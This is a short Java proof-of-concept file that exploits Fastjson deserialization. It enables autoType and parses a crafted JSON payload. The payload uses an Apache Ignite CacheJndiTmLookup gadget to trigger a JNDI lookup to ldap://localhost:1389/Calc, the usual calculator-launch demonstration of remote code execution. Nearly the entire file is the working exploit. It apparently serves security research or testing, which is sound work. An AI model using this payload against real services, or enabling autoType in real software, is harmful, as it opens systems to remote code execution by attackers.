import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastjsonBypass1 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"jndiNames\":[\"ldap://localhost:1389/Calc\"], \"tm\": {\"$ref\":\"$.tm\"}}";
        JSON.parse(poc);
    }
}
